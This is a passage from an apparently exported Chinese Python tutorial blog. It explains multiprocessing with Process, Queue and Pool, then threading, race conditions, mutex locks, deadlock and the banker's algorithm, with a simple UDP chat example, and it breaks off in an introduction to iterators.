kwargs]]]]])target：如果传递了函数的引用，可以任务这个子进程就执行这里的代码args：给target指定的函数传递的参数，以元组的方式传递kwargs：给target指定的函数传递命名参数name：给进程设定一个名字，可以不设定group：指定进程组，大多数情况下用不到Process创建的实例对象的常用方法：start()：启动子进程实例（创建子进程）is_alive()：判断进程子进程是否还在活着join([timeout])：是否等待子进程执行结束，或等待多少秒terminate()：不管任务是否完成，立即终止子进程Process创建的实例对象的常用属性：name：当前进程的别名，默认为Process-N，N为从1开始递增的整数pid：当前进程的pid（进程号）给子进程指定的函数传递参数12345678910111213141516from multiprocessing import Processimport osfrom time import sleepdef run_proc(name, age, **kwargs): for i in range(10): print('子进程运行中，name= %s,age=%d ,pid=%d...' % (name, age, os.getpid())) print(kwargs) sleep(0.2)if __name__=='__main__': p = Process(target=run_proc, args=('test',18), kwargs=&#123;"m":20&#125;) p.start() sleep(1) # 1秒中之后，立即结束子进程 p.terminate() p.join()进程间不共享全局变量12345678910111213141516171819202122232425from multiprocessing import Processimport osimport timenums = [11, 22]def work1(): """子进程要执行的代码""" print("in process1 pid=%d ,nums=%s" % (os.getpid(), nums)) for i in range(3): nums.append(i) time.sleep(1) print("in process1 pid=%d ,nums=%s" % (os.getpid(), nums))def work2(): """子进程要执行的代码""" print("in process2 pid=%d ,nums=%s" % (os.getpid(), nums))if __name__ == '__main__': p1 = Process(target=work1) p1.start() p1.join() p2 = Process(target=work2) p2.start()运行结果:12345in process1 pid=11349 ,nums=[11, 22]in process1 pid=11349 ,nums=[11, 22, 0]in process1 pid=11349 ,nums=[11, 22, 0, 1]in process1 pid=11349 ,nums=[11, 22, 0, 1, 2]in process2 pid=11350 ,nums=[11, 22]进程、线程对比功能进程，能够完成多任务，比如 在一台电脑上能够同时运行多个QQ线程，能够完成多任务，比如 一个QQ中的多个聊天窗口定义的不同进程是系统进行资源分配和调度的一个独立单位.线程是进程的一个实体,是CPU调度和分派的基本单位,它是比进程更小的能独立运行的基本单位.线程自己基本上不拥有系统资源,只拥有一点在运行中必不可少的资源(如程序计数器,一组寄存器和栈),但是它可与同属一个进程的其他的线程共享进程所拥有的全部资源.区别一个程序至少有一个进程,一个进程至少有一个线程.线程的划分尺度小于进程(资源比进程少)，使得多线程程序的并发性高。进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率![]/images_jincheng/002.png)线程不能够独立执行，必须依存在进程中可以将进程理解为工厂中的一条流水线，而其中的线程就是这个流水线上的工人优缺点线程和进程在使用上各有优缺点：线程执行开销小，但不利于资源的管理和保护；而进程正相反。进程间通信-QueueProcess之间有时需要通信，操作系统提供了很多机制来实现进程间的通信。Queue的使用可以使用multiprocessing模块的Queue实现多进程之间的数据传递，Queue本身是一个消息列队程序，首先用一个小实例来演示一下Queue的工作原理：123456789101112131415161718192021222324252627from multiprocessing import Queueq=Queue(3) #初始化一个Queue对象，最多可接收三条put消息q.put("消息1") q.put("消息2")print(q.full()) #Falseq.put("消息3")print(q.full()) #True#因为消息列队已满下面的try都会抛出异常，第一个try会等待2秒后再抛出异常，第二个Try会立刻抛出异常try: q.put("消息4",True,2)except: print("消息列队已满，现有消息数量:%s"%q.qsize())try: q.put_nowait("消息4")except: print("消息列队已满，现有消息数量:%s"%q.qsize())#推荐的方式，先判断消息列队是否已满，再写入if not q.full(): q.put_nowait("消息4")#读取消息时，先判断消息列队是否为空，再读取if not q.empty(): for i in range(q.qsize()): print(q.get_nowait())运行结果:1234567FalseTrue消息列队已满，现有消息数量:3消息列队已满，现有消息数量:3消息1消息2消息3说明初始化Queue()对象时（例如：q=Queue()），若括号中没有指定最大可接收的消息数量，或数量为负值，那么就代表可接受的消息数量没有上限（直到内存的尽头）；Queue.qsize()：返回当前队列包含的消息数量；Queue.empty()：如果队列为空，返回True，反之False ；Queue.full()：如果队列满了，返回True,反之False；Queue.get([block[, timeout]])：获取队列中的一条消息，然后将其从列队中移除，block默认值为True；1）如果block使用默认值，且没有设置timeout（单位秒），消息列队如果为空，此时程序将被阻塞（停在读取状态），直到从消息列队读到消息为止，如果设置了timeout，则会等待timeout秒，若还没读取到任何消息，则抛出”Queue.Empty”异常；2）如果block值为False，消息列队如果为空，则会立刻抛出”Queue.Empty”异常；Queue.get_nowait()：相当Queue.get(False)；Queue.put(item,[block[, timeout]])：将item消息写入队列，block默认值为True；1）如果block使用默认值，且没有设置timeout（单位秒），消息列队如果已经没有空间可写入，此时程序将被阻塞（停在写入状态），直到从消息列队腾出空间为止，如果设置了timeout，则会等待timeout秒，若还没空间，则抛出”Queue.Full”异常；2）如果block值为False，消息列队如果没有空间可写入，则会立刻抛出”Queue.Full”异常；Queue.put_nowait(item)：相当Queue.put(item, False)；Queue实例我们以Queue为例，在父进程中创建两个子进程，一个往Queue里写数据，一个从Queue里读数据：1234567891011121314151617181920212223242526272829303132333435from multiprocessing import Process, Queueimport os, time, random# 写数据进程执行的代码:def write(q): for value in ['A', 'B', 'C']: print('Put %s to queue...' % value) q.put(value) time.sleep(random.random())# 读数据进程执行的代码:def read(q): while True: if not q.empty(): value = q.get(True) print('Get %s from queue.' % value) time.sleep(random.random()) else: breakif __name__=='__main__': # 父进程创建Queue，并传给各个子进程： q = Queue() pw = Process(target=write, args=(q,)) pr = Process(target=read, args=(q,)) # 启动子进程pw，写入: pw.start() # 等待pw结束: pw.join() # 启动子进程pr，读取: pr.start() pr.join() # pr进程里是死循环，无法等待其结束，只能强行终止: print('') print('所有数据都写入并且读完')进程池Pool当需要创建的子进程数量不多时，可以直接利用multiprocessing中的Process动态成生多个进程，但如果是上百甚至上千个目标，手动的去创建进程的工作量巨大，此时就可以用到multiprocessing模块提供的Pool方法。初始化Pool时，可以指定一个最大进程数，当有新的请求提交到Pool中时，如果池还没有满，那么就会创建一个新的进程用来执行该请求；但如果池中的进程数已经达到指定的最大值，那么该请求就会等待，直到池中有进程结束，才会用之前的进程来执行新的任务，请看下面的实例：12345678910111213141516171819202122from multiprocessing import Poolimport os, time, randomdef worker(msg): t_start = time.time() print("%s开始执行,进程号为%d" % (msg,os.getpid())) # random.random()随机生成0~1之间的浮点数 time.sleep(random.random()*2) t_stop = time.time() print(msg,"执行完毕，耗时%0.2f" % (t_stop-t_start))if __name__ == '__main__': po = Pool(3) # 定义一个进程池，最大进程数3 for i in range(0, 10): # Pool().apply_async(要调用的目标,(传递给目标的参数元祖,)) # 每次循环将会用空闲出来的子进程去调用目标 po.apply_async(worker, (i,)) print("----start----") po.close() # 关闭进程池，关闭后po不再接收新的请求 po.join() # 等待po中所有子进程执行完成，必须放在close语句之后 print("-----end-----")运行结果:12345678910111213141516171819202122----start----0开始执行,进程号为214661开始执行,进程号为214682开始执行,进程号为214670 执行完毕，耗时1.013开始执行,进程号为214662 执行完毕，耗时1.244开始执行,进程号为214673 执行完毕，耗时0.565开始执行,进程号为214661 执行完毕，耗时1.686开始执行,进程号为214684 执行完毕，耗时0.677开始执行,进程号为214675 执行完毕，耗时0.838开始执行,进程号为214666 执行完毕，耗时0.759开始执行,进程号为214687 执行完毕，耗时1.038 执行完毕，耗时1.059 执行完毕，耗时1.69-----end-----multiprocessing.Pool常用函数解析：apply_async(func[, args[, kwds]]) ：使用非阻塞方式调用func（并行执行，堵塞方式必须等待上一个进程退出才能执行下一个进程），args为传递给func的参数列表，kwds为传递给func的关键字参数列表；close()：关闭Pool，使其不再接受新的任务；terminate()：不管任务是否完成，立即终止；join()：主进程阻塞，等待子进程的退出， 必须在close或terminate之后使用；进程池中的Queue如果要使用Pool创建进程，就需要使用multiprocessing.Manager()中的Queue()，而不是multiprocessing.Queue()，否则会得到一条如下的错误信息：RuntimeError: Queue objects should only be shared between processes through inheritance.下面的实例演示了进程池中的进程如何通信：1234567891011121314151617181920212223242526# 修改import中的Queue为Managerfrom multiprocessing import Manager,Poolimport os,time,randomdef reader(q): print("reader启动(%s),父进程为(%s)" % (os.getpid(), os.getppid())) for i in range(q.qsize()): print("reader从Queue获取到消息：%s" % q.get(True))def writer(q): print("writer启动(%s),父进程为(%s)" % (os.getpid(), os.getppid())) for i in "itcast": q.put(i)if __name__=="__main__": print("(%s) start" % os.getpid()) q = Manager().Queue() # 使用Manager中的Queue po = Pool() po.apply_async(writer, (q,)) time.sleep(1) # 先让上面的任务向Queue存入数据，然后再让下面的任务开始从中取数据 po.apply_async(reader, (q,)) po.close() po.join() print("(%s) End" % os.getpid())运行结果:12345678910(11095) startwriter启动(11097),父进程为(11095)reader启动(11098),父进程为(11095)reader从Queue获取到消息：ireader从Queue获取到消息：treader从Queue获取到消息：creader从Queue获取到消息：areader从Queue获取到消息：sreader从Queue获取到消息：t(11095) End应用：文件夹copy器（多进程版）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import multiprocessingimport osimport timeimport randomdef copy_file(queue, file_name,source_folder_name, dest_folder_name): """copy文件到指定的路径""" f_read = open(source_folder_name + "/" + file_name, "rb") f_write = open(dest_folder_name + "/" + file_name, "wb") while True: time.sleep(random.random()) content = f_read.read(1024) if content: f_write.write(content) else: break f_read.close() f_write.close() # 发送已经拷贝完毕的文件名字 queue.put(file_name)def main(): # 获取要复制的文件夹 source_folder_name = input("请输入要复制文件夹名字:") # 整理目标文件夹 dest_folder_name = source_folder_name + "[副本]" # 创建目标文件夹 try: os.mkdir(dest_folder_name) except: pass # 如果文件夹已经存在，那么创建会失败 # 获取这个文件夹中所有的普通文件名 file_names = os.listdir(source_folder_name) # 创建Queue queue = multiprocessing.Manager().Queue() # 创建进程池 pool = multiprocessing.Pool(3) for file_name in file_names: # 向进程池中添加任务 pool.apply_async(copy_file, args=(queue, file_name, source_folder_name, dest_folder_name)) # 主进程显示进度 pool.close() all_file_num = len(file_names) while True: file_name = queue.get() if file_name in file_names: file_names.remove(file_name) copy_rate = (all_file_num-len(file_names))*100/all_file_num print("\r%.2f...(%s)" % (copy_rate, file_name) + " "*50, end="") if copy_rate &gt;= 100: break print()if __name__ == "__main__": main()]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多任务_线程]]></title>
    <url>%2F2019%2F12%2F31%2F%E5%A4%9A%E4%BB%BB%E5%8A%A1_%E7%BA%BF%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[多任务的概念简单地说，就是操作系统可以同时运行多个任务。现在，多核CPU已经非常普及了，但是，即使过去的单核CPU，也可以执行多任务。由于CPU执行代码都是顺序执行的，那么，单核CPU是怎么执行多任务的呢？答案就是操作系统轮流让各个任务交替执行，任务1执行0.01秒，切换到任务2，任务2执行0.01秒，再切换到任务3，执行0.01秒……这样反复执行下去。表面上看，每个任务都是交替执行的，但是，由于CPU的执行速度实在是太快了，我们感觉就像所有任务都在同时执行一样。真正的并行执行多任务只能在多核CPU上实现，但是，由于任务数量远远多于CPU的核心数量，所以，操作系统也会自动把很多任务轮流调度到每个核心上执行。注意：并发：指的是任务数多于cpu核数，通过操作系统的各种任务调度算法，实现用多个任务“一起”执行（实际上总有一些任务不在执行，因为切换任务的速度相当快，看上去一起执行而已）并行：指的是任务数小于等于cpu核数，即任务真的是一起执行的线程python的thread模块是比较底层的模块，python的threading模块是对thread做了一些包装的，可以更加方便的被使用使用threading模块单线程执行12345678910#coding=utf-8import timedef saySorry(): print("亲爱的，我错了，我能吃饭了吗？") time.sleep(1)if __name__ == "__main__": for i in range(5): saySorry()多线程执行123456789101112#coding=utf-8import threadingimport timedef saySorry(): print("亲爱的，我错了，我能吃饭了吗？") time.sleep(1)if __name__ == "__main__": for i in range(5): t = threading.Thread(target=saySorry) t.start() #启动线程，即让线程开始执行说明可以明显看出使用了多线程并发的操作，花费时间要短很多当调用start()时，才会真正的创建线程，并且开始执行主线程会等待所有的子线程结束后才结束12345678910111213141516171819202122232425#coding=utf-8import threadingfrom time import sleep,ctimedef sing(): for i in range(3): print("正在唱歌...%d"%i) sleep(1)def dance(): for i in range(3): print("正在跳舞...%d"%i) sleep(1)if __name__ == '__main__': print('---开始---:%s'%ctime()) t1 = threading.Thread(target=sing) t2 = threading.Thread(target=dance) t1.start() t2.start() #sleep(5) # 屏蔽此行代码，试试看，程序是否会立马结束？ print('---结束---:%s'%ctime())查看线程数量123456789101112131415161718192021222324252627282930#coding=utf-8import threadingfrom time import sleep,ctimedef sing(): for i in range(3): print("正在唱歌...%d"%i) sleep(1)def dance(): for i in range(3): print("正在跳舞...%d"%i) sleep(1)if __name__ == '__main__': print('---开始---:%s'%ctime()) t1 = threading.Thread(target=sing) t2 = threading.Thread(target=dance) t1.start() t2.start() while True: length = len(threading.enumerate()) print('当前运行的线程数为：%d'%length) if length&lt;=1: break sleep(0.5)线程-注意点线程执行代码的封装通过使用threading模块能完成多任务的程序开发，为了让每个线程的封装性更完美，所以使用threading模块时，往往会定义一个新的子类class，只要继承threading.Thread就可以了，然后重写run方法示例如下：123456789101112131415#coding=utf-8import threadingimport timeclass MyThread(threading.Thread): def run(self): for i in range(3): time.sleep(1) msg = "I'm "+self.name+' @ '+str(i) #name属性中保存的是当前线程的名字 print(msg)if __name__ == '__main__': t = MyThread() t.start()说明python的threading.Thread类有一个run方法，用于定义线程的功能函数，可以在自己的线程类中覆盖该方法。而创建自己的线程实例后，通过Thread类的start方法，可以启动该线程，交给python虚拟机进行调度，当该线程获得执行的机会时，就会调用run方法执行线程。线程的执行顺序12345678910111213141516#coding=utf-8import threadingimport timeclass MyThread(threading.Thread): def run(self): for i in range(3): time.sleep(1) msg = "I'm "+self.name+' @ '+str(i) print(msg)def test(): for i in range(5): t = MyThread() t.start()if __name__ == '__main__': test()说明从代码和执行结果我们可以看出，多线程程序的执行顺序是不确定的。当执行到sleep语句时，线程将被阻塞（Blocked），到sleep结束后，线程进入就绪（Runnable）状态，等待调度。而线程调度将自行选择一个线程执行。上面的代码中只能保证每个线程都运行完整个run函数，但是线程的启动顺序、run函数中每次循环的执行顺序都不能确定。修改上述代码,使之能按顺序执行12345678910111213141516171819202122#!/usr/bin/env python# -*- coding: utf-8 -*-import threadingimport timeclass MyThread(threading.Thread): def run(self): for i in range(3): # time.sleep(1) msg = "I'm " + self.name + ' @ ' + str(i) print(msg)def test(): for i in range(5): t = MyThread() t.start() time.sleep(1) # 延迟时间可适当延长if __name__ == '__main__': test()总结每个线程默认有一个名字，尽管上面的例子中没有指定线程对象的name，但是python会自动为线程指定一个名字。当线程的run()方法结束时该线程完成。无法控制线程调度程序，但可以通过别的方式来影响线程调度的方式。多线程-共享全局变量1234567891011121314151617181920212223242526272829303132#!/usr/bin/env python# -*- coding: utf-8 -*-from threading import Threadimport timeg_num = 100def work1(): global g_num for i in range(3): g_num += 1 print("----in work1, g_num is %d---" % g_num)def work2(): global g_num print("----in work2, g_num is %d---" % g_num)print("---线程创建之前g_num is %d---" % g_num)t1 = Thread(target=work1)t1.start()# 延时一会，保证t1线程中的事情做完time.sleep(1)t2 = Thread(target=work2)t2.start()列表当做实参传递到线程中12345678910111213141516171819202122#!/usr/bin/env python# -*- coding: utf-8 -*-from threading import Threadimport timedef work1(nums): nums.append(44) print("----in work1---", nums)def work2(nums): # 延时一会，保证t1线程中的事情做完 time.sleep(1) print("----in work2---", nums)g_nums = [11, 22, 33]t1 = Thread(target=work1, args=(g_nums,))t1.start()t2 = Thread(target=work2, args=(g_nums,))t2.start()总结在一个进程内的所有线程共享全局变量，很方便在多个线程间共享数据缺点就是，线程是对全局变量随意遂改可能造成多线程之间对全局变量的混乱（即线程非安全）多线程-共享全局变量问题多线程开发可能遇到的问题假设两个线程t1和t2都要对全局变量g_num(默认是0)进行加1运算，t1和t2都各对g_num加10次，g_num的最终的结果应该为20。但是由于是多线程同时操作，有可能出现下面情况：在g_num=0时，t1取得g_num=0。此时系统把t1调度为”sleeping”状态，把t2转换为”running”状态，t2也获得g_num=0然后t2对得到的值进行加1并赋给g_num，使得g_num=1然后系统又把t2调度为”sleeping”，把t1转为”running”。线程t1又把它之前得到的0加1后赋值给g_num。这样导致虽然t1和t2都对g_num加1，但结果仍然是g_num=1测试11234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python# -*- coding: utf-8 -*-import threadingimport timeg_num = 0def work1(num): global g_num for i in range(num): g_num += 1 print("----in work1, g_num is %d---" % g_num)def work2(num): global g_num for i in range(num): g_num += 1 print("----in work2, g_num is %d---" % g_num)print("---线程创建之前g_num is %d---" % g_num)t1 = threading.Thread(target=work1, args=(100,))t1.start()t2 = threading.Thread(target=work2, args=(100,))t2.start()while len(threading.enumerate()) != 1: time.sleep(1)print("2个线程对同一个全局变量操作之后的最终结果是:%s" % g_num)运行结果:1234---线程创建之前g_num is 0-------in work1, g_num is 100-------in work2, g_num is 200---2个线程对同一个全局变量操作之后的最终结果是:200测试212345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env python# -*- coding: utf-8 -*-import threadingimport timeg_num = 0def work1(num): global g_num for i in range(num): g_num += 1 print("----in work1, g_num is %d---" % g_num)def work2(num): global g_num for i in range(num): g_num += 1 print("----in work2, g_num is %d---" % g_num)print("---线程创建之前g_num is %d---" % g_num)t1 = threading.Thread(target=work1, args=(1000000,))t1.start()# time.sleep(5) # 可加延时确保t1先执行完t2 = threading.Thread(target=work2, args=(1000000,))t2.start()while len(threading.enumerate()) != 1: time.sleep(1)print("2个线程对同一个全局变量操作之后的最终结果是:%s" % g_num)运行结果:1234---线程创建之前g_num is 0-------in work2, g_num is 1306621-------in work1, g_num is 1329573---2个线程对同一个全局变量操作之后的最终结果是:1329573结论如果多个线程同时对同一个全局变量操作，会出现资源竞争问题，从而数据结果会不正确同步的概念同步就是协同步调，按预定的先后次序进行运行。如:你说完，我再说。“同”字从字面上容易理解为一起动作,其实不是，”同”字应是指协同、协助、互相配合。如进程、线程同步，可理解为进程或线程A和B一块配合，A执行到一定程度时要依靠B的某个结果，于是停下来，示意B运行;B执行，再将结果给A;A再继续操作。解决线程同时修改全局变量的方式可以通过线程同步来进行解决,思路如下:系统调用t1，然后获取到g_num的值为0，此时上一把锁，即不允许其他线程操作g_numt1对g_num的值进行+1t1解锁，此时g_num的值为1，其他的线程就可以使用g_num了，而且是g_num的值不是0而是1同理其他线程在对g_num进行修改时，都要先上锁，处理完后再解锁，在上锁的整个过程中不允许其他线程访问，就保证了数据的正确性互斥锁当多个线程几乎同时修改某一个共享数据的时候，需要进行同步控制线程同步能够保证多个线程安全访问竞争资源，最简单的同步机制是引入互斥锁。互斥锁为资源引入一个状态：锁定/非锁定某个线程要更改共享数据时，先将其锁定，此时资源的状态为“锁定”，其他线程不能更改；直到该线程释放资源，将资源的状态变成“非锁定”，其他的线程才能再次锁定该资源。互斥锁保证了每次只有一个线程进行写入操作，从而保证了多线程情况下数据的正确性。threading模块中定义了Lock类，可以方便的处理锁定：123456# 创建锁mutex = threading.Lock()# 锁定mutex.acquire()# 释放mutex.release()注意：如果这个锁之前是没有上锁的，那么acquire不会堵塞如果在调用acquire对这个锁上锁之前 它已经被 其他线程上了锁，那么此时acquire会堵塞，直到这个锁被解锁为止使用互斥锁完成2个线程对同一个全局变量各加100万次的操作12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/usr/bin/env python# -*- coding: utf-8 -*-import threadingimport timeg_num = 0def test1(num): global g_num for i in range(num): mutex.acquire() # 上锁 g_num += 1 mutex.release() # 解锁 print("---test1---g_num=%d" % g_num)def test2(num): global g_num for i in range(num): mutex.acquire() # 上锁 g_num += 1 mutex.release() # 解锁 print("---test2---g_num=%d" % g_num)# 创建一个互斥锁# 默认是未上锁的状态mutex = threading.Lock()# 创建2个线程，让他们各自对g_num加1000000次p1 = threading.Thread(target=test1, args=(1000000,))p1.start()p2 = threading.Thread(target=test2, args=(1000000,))p2.start()# 等待计算完成while len(threading.enumerate()) != 1: time.sleep(1)print("2个线程对同一个全局变量操作之后的最终结果是:%s" % g_num)运行结果：123---test1---g_num=1940444---test2---g_num=20000002个线程对同一个全局变量操作之后的最终结果是:2000000可以看到最后的结果，加入互斥锁后，其结果与预期相符。上锁解锁过程当一个线程调用锁的acquire()方法获得锁时，锁就进入“locked”状态。每次只有一个线程可以获得锁。如果此时另一个线程试图获得这个锁，该线程就会变为“blocked”状态，称为“阻塞”，直到拥有锁的线程调用锁的release()方法释放锁之后，锁进入“unlocked”状态。线程调度程序从处于同步阻塞状态的线程中选择一个来获得锁，并使得该线程进入运行（running）状态。总结锁的好处：确保了某段关键代码只能由一个线程从头到尾完整地执行锁的坏处：阻止了多线程并发执行，包含锁的某段代码实际上只能以单线程模式执行，效率就大大地下降了由于可以存在多个锁，不同的线程持有不同的锁，并试图获取对方持有的锁时，可能会造成死锁死锁在线程间共享多个资源的时候，如果两个线程分别占有一部分资源并且同时等待对方的资源，就会造成死锁。尽管死锁很少发生，但一旦发生就会造成应用的停止响应。下面看一个死锁的例子123456789101112131415161718192021222324252627282930313233343536373839404142434445import threadingimport timeclass MyThread1(threading.Thread): def run(self): # 对mutexA上锁 mutexA.acquire() # mutexA上锁后，延时1秒，等待另外那个线程 把mutexB上锁 print(self.name+'----do1---up----') time.sleep(1) # 此时会堵塞，因为这个mutexB已经被另外的线程抢先上锁了 mutexB.acquire() print(self.name+'----do1---down----') mutexB.release() # 对mutexA解锁 mutexA.release()class MyThread2(threading.Thread): def run(self): # 对mutexB上锁 mutexB.acquire() # mutexB上锁后，延时1秒，等待另外那个线程 把mutexA上锁 print(self.name+'----do2---up----') time.sleep(1) # 此时会堵塞，因为这个mutexA已经被另外的线程抢先上锁了 mutexA.acquire() print(self.name+'----do2---down----') mutexA.release() # 对mutexB解锁 mutexB.release()mutexA = threading.Lock()mutexB = threading.Lock()if __name__ == '__main__': t1 = MyThread1() t2 = MyThread2() t1.start() t2.start()运行此代码会发现此时已经进入到了死锁状态，可以使用ctrl-c退出避免死锁程序设计时要尽量避免（银行家算法）添加超时时间等附录-银行家算法[背景知识]一个银行家如何将一定数目的资金安全地借给若干个客户，使这些客户既能借到钱完成要干的事，同时银行家又能收回全部资金而不至于破产，这就是银行家问题。这个问题同操作系统中资源分配问题十分相似：银行家就像一个操作系统，客户就像运行的进程，银行家的资金就是系统的资源。[问题的描述]一个银行家拥有一定数量的资金，有若干个客户要贷款。每个客户须在一开始就声明他所需贷款的总额。若该客户贷款总额不超过银行家的资金总数，银行家可以接收客户的要求。客户贷款是以每次一个资金单位（如1万RMB等）的方式进行的，客户在借满所需的全部单位款额之前可能会等待，但银行家须保证这种等待是有限的，可完成的。例如：有三个客户C1，C2，C3，向银行家借款，该银行家的资金总额为10个资金单位，其中C1客户要借9各资金单位，C2客户要借3个资金单位，C3客户要借8个资金单位，总计20个资金单位。某一时刻的状态如图所示。对于a图的状态，按照安全序列的要求，我们选的第一个客户应满足该客户所需的贷款小于等于银行家当前所剩余的钱款，可以看出只有C2客户能被满足：C2客户需1个资金单位，小银行家手中的2个资金单位，于是银行家把1个资金单位借给C2客户，使之完成工作并归还所借的3个资金单位的钱，进入b图。同理，银行家把4个资金单位借给C3客户，使其完成工作，在c图中，只剩一个客户C1，它需7个资金单位，这时银行家有8个资金单位，所以C1也能顺利借到钱并完成工作。最后（见图d）银行家收回全部10个资金单位，保证不赔本。那麽客户序列{C1，C2，C3}就是个安全序列，按照这个序列贷款，银行家才是安全的。否则的话，若在图b状态时，银行家把手中的4个资金单位借给了C1，则出现不安全状态：这时C1，C3均不能完成工作，而银行家手中又没有钱了，系统陷入僵持局面，银行家也不能收回投资。综上所述，银行家算法是从当前状态出发，逐个按安全序列检查各客户谁能完成其工作，然后假定其完成工作且归还全部贷款，再进而检查下一个能完成工作的客户，……。如果所有客户都能完成工作，则找到一个安全序列，银行家才是安全的。案例：多任务版udp聊天器说明编写一个有2个线程的程序线程1用来接收数据然后显示线程2用来检测键盘数据然后通过udp发送数据参考代码:123456789101112131415161718192021222324252627282930313233343536373839404142import socketimport threadingdef send_msg(udp_socket): """获取键盘数据，并将其发送给对方""" while True: # 1. 从键盘输入数据 msg = input("\n请输入要发送的数据:") # 2. 输入对方的ip地址 dest_ip = input("\n请输入对方的ip地址:") # 3. 输入对方的port dest_port = int(input("\n请输入对方的port:")) # 4. 发送数据 udp_socket.sendto(msg.encode("utf-8"), (dest_ip, dest_port))def recv_msg(udp_socket): """接收数据并显示""" while True: # 1. 接收数据 recv_msg = udp_socket.recvfrom(1024) # 2. 解码 recv_ip = recv_msg[1] recv_msg = recv_msg[0].decode("utf-8") # 3. 显示接收到的数据 print("&gt;&gt;&gt;%s:%s" % (str(recv_ip), recv_msg))def main(): # 1. 创建套接字 udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # 2. 绑定本地信息 udp_socket.bind(("", 7890)) # 3. 创建一个子线程用来接收数据 t = threading.Thread(target=recv_msg, args=(udp_socket,)) t.start() # 4. 让主线程用来检测键盘数据并且发送 send_msg(udp_socket)if __name__ == "__main__": main()]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[多任务_协程]]></title>
    <url>%2F2019%2F12%2F31%2F%E5%A4%9A%E4%BB%BB%E5%8A%A1_%E5%8D%8F%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[迭代器迭代是访问集合元素的一种方式。迭代器是一个可以记住遍历的位置的对象。迭代器对象从集合的第一个元素开始访问，直到所有的元素被访问完结束。迭代器只能往前不会后退。1. 可迭代对象我们已经知道可以对list、tuple、str等类型的数据使用for…in…的循环语法从其中依次拿到数据进行使用，我们把这样的过程称为遍历，也叫迭代。但是，是否所有的数据类型都可以放到for…in…的语句中，然后让for…in…每次从中取出一条数据供我们使用，即供我们迭代吗？12345678910111213141516171819202122232425262728&gt;&gt;&gt; for i in 100:... print(i)...Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;TypeError: 'int' object is not iterable&gt;&gt;&gt;# int整型不是iterable，即int整型不是可以迭代的# 我们自定义一个容器MyList用来存放数据，可以通过add方法向其中添加数据&gt;&gt;&gt; class MyList(object):... def __init__(self):... self.container = []... def add(self, item):... self.container.append(item)...&gt;&gt;&gt; mylist = MyList()&gt;&gt;&gt; mylist.add(1)&gt;&gt;&gt; mylist.add(2)&gt;&gt;&gt; mylist.add(3)&gt;&gt;&gt; for num in mylist:... print(num)...Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;TypeError: 'MyList' object is not iterable&gt;&gt;&gt;# MyList容器的对象也是不能迭代的我们自定义了一个容器类型MyList，在将一个存放了多个数据的MyList对象放到for…in…的语句中，发现for…in…并不能从中依次取出一条数据返回给我们，也就说我们随便封装了一个可以存放多条数据的类型却并不能被迭代使用。我们把可以通过for…in…这类语句迭代读取一条数据供我们使用的对象称之为可迭代对象（Iterable）**。2. 如何判断一个对象是否可以迭代可以使用 isinstance() 判断一个对象是否是 Iterable 对象：12345678910111213141516In [50]: from collections import IterableIn [51]: isinstance([], Iterable)Out[51]: TrueIn [52]: isinstance(&#123;&#125;, Iterable)Out[52]: TrueIn [53]: isinstance('abc', Iterable)Out[53]: TrueIn [54]: isinstance(mylist, Iterable)Out[54]: FalseIn [55]: isinstance(100, Iterable)Out[55]: False3. 可迭代对象的本质我们分析对可迭代对象进行迭代使用的过程，发现每迭代一次（即在for…in…中每循环一次）都会返回对象中的下一条数据，一直向后读取数据直到迭代了所有数据后结束。那么，在这个过程中就应该有一个“人”去记录每次访问到了第几条数据，以便每次迭代都可以返回下一条数据。我们把这个能帮助我们进行数据迭代的“人”称为迭代器(Iterator)。可迭代对象的本质就是可以向我们提供一个这样的中间“人”即迭代器帮助我们对其进行迭代遍历使用。可迭代对象通过__iter__方法向我们提供一个迭代器，我们在迭代一个可迭代对象的时候，实际上就是先获取该对象提供的一个迭代器，然后通过这个迭代器来依次获取对象中的每一个数据.那么也就是说，一个具备了__iter__方法的对象，就是一个可迭代对象。12345678910111213141516&gt;&gt;&gt; class MyList(object):... def __init__(self):... self.container = []... def add(self, item):... self.container.append(item)... def __iter__(self):... """返回一个迭代器"""... # 我们暂时忽略如何构造一个迭代器对象... pass...&gt;&gt;&gt; mylist = MyList()&gt;&gt;&gt; from collections import Iterable&gt;&gt;&gt; isinstance(mylist, Iterable)True&gt;&gt;&gt;# 这回测试发现添加了__iter__方法的mylist对象已经是一个可迭代对象了4. iter()函数与next()函数list、tuple等都是可迭代对象，我们可以通过iter()函数获取这些可迭代对象的迭代器。然后我们可以对获取到的迭代器不断使用next()函数来获取下一条数据。iter()函数实际上就是调用了可迭代对象的__iter__方法。1234567891011121314151617&gt;&gt;&gt; li = [11, 22, 33, 44, 55]&gt;&gt;&gt; li_iter = iter(li)&gt;&gt;&gt; next(li_iter)11&gt;&gt;&gt; next(li_iter)22&gt;&gt;&gt; next(li_iter)33&gt;&gt;&gt; next(li_iter)44&gt;&gt;&gt; next(li_iter)55&gt;&gt;&gt; next(li_iter)Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;StopIteration&gt;&gt;&gt;注意，当我们已经迭代完最后一个数据之后，再次调用next()函数会抛出StopIteration的异常，来告诉我们所有数据都已迭代完成，不用再执行next()函数了。5. 如何判断一个对象是否是迭代器可以使用 isinstance() 判断一个对象是否是 Iterator 对象：12345678910In [56]: from collections import IteratorIn [57]: isinstance([], Iterator)Out[57]: FalseIn [58]: isinstance(iter([]), Iterator)Out[58]: TrueIn [59]: isinstance(iter("abc"), Iterator)Out[59]: True6. 